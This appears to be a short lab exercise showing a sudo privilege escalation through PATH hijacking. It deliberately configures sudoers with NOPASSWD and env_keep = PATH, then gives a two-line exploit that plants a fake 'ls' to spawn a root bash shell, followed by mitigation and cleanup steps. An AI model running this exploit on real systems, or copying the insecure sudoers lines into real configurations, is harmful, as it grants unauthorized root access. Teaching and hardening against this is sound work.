# Setup

```sh
# root
cp /etc/sudoers /etc/sudoers.bak
adduser sudo1
echo "sudo1 ALL=(ALL) NOPASSWD: /home/sudo1/script.sh" >> /etc/sudoers
echo "Defaults env_keep = PATH" >> /etc/sudoers
echo 'ls -la' > /home/sudo1/script.sh
chmod +x /home/sudo1/script.sh
```

# Exploit

```bash
echo '/bin/bash' > /tmp/ls

sudo PATH=/tmp/:$PATH /home/sudo1/script.sh
```


# Mitigate

```bash
# Remove env_keep += PATH
# Set secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

# Clean Up

```bash
deluser sudo1 --remove-home
cp /etc/sudoers.bak /etc/sudoers
```